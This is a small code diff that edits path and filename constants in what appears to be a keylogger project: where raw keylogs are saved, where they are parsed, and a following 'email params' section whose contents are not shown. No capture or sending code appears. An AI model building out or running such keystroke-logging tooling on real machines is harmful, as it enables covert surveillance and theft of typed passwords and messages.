@@ -4,13 +4,13 @@ import platform
 import glob
 import configparser
 
-WRITE_KEYLOG_OUTPATH = 'keylogs/raw_keylogs'
-WRITE_KEYLOG_FILENAME =  'keylog_' + str(datetime.datetime.today()).replace(' ', '') + '.txt'
+WRITE_KEYLOG_OUTPATH = 'logs/keylogs/keylog_outputs'
+WRITE_KEYLOG_FILENAME =  'keylog_' + str(datetime.datetime.today()).replace(' ', '_') + '.txt'
 
 ##### parse keylogged params #####
 
-READ_KEYLOGGED_DIR = 'keylogs/raw_keylogs/'
-WRITE_KEYLOGGED_DIR = 'keylogs/parsed_keylogs/'
+READ_KEYLOGGED_DIR = WRITE_KEYLOG_OUTPATH
+WRITE_KEYLOGGED_DIR = 'keylogs/keylogs_parsed/'
 
 ##### email params #####
 
